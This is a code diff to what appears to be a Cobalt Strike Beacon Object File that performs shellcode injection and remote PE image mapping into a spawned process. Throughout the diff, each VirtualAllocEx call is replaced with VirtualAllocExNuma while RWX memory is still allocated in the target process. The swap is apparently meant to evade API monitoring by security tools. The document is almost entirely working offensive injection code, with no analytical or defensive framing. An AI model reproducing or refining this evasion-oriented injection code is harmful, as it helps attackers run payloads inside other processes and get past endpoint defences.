@@ -610,8 +610,8 @@ void go(char *rawArgs, int rawLen) {
 
     if (mode == MODE_SHELLCODE) {
         /* ---- SHELLCODE INJECTION ---- */
-        LPVOID pSc = KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL, payloadSize + 32,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        LPVOID pSc = KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess, NULL, payloadSize + 32,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
         if (!pSc) {
             BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
             SpawnCleanup(&sctx, FALSE); goto cleanup;
@@ -702,21 +702,21 @@ void go(char *rawArgs, int rawLen) {
             BOOL hasRelocs = (pi2.relocDir.Size > 0 && pi2.relocDir.VirtualAddress > 0);
             BYTE *pRemote = NULL;
             if (hasRelocs) {
-                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
-                    (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
+                    (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
                 if (!pRemote)
-                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
-                        (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
+                        (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
             } else {
-                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
-                    (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
+                    (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
                 if (!pRemote)
-                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
-                        (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
+                        (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
             }
             if (!pRemote)
-                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
-                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess, NULL,
+                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
             if (!pRemote) {
                 BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
                 KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
@@ -773,25 +773,25 @@ void go(char *rawArgs, int rawLen) {
             BOOL hasRelocs = (pi2.relocDir.Size > 0 && pi2.relocDir.VirtualAddress > 0);
             BYTE *pRemote = NULL;
             if (hasRelocs) {
-                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
                     (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
-                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
                 if (!pRemote)
-                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
                         (PVOID)pi2.imageBase, pi2.sizeOfImage,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
             } else {
-                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
                     (PVOID)pi2.imageBase, pi2.sizeOfImage,
-                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
                 if (!pRemote)
-                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess,
                         (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
             }
             if (!pRemote)
-                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
-                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                pRemote = (BYTE*)KERNEL32$VirtualAllocExNuma(sctx.pi.hProcess, NULL,
+                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
             if (!pRemote) {
                 BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
                 KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
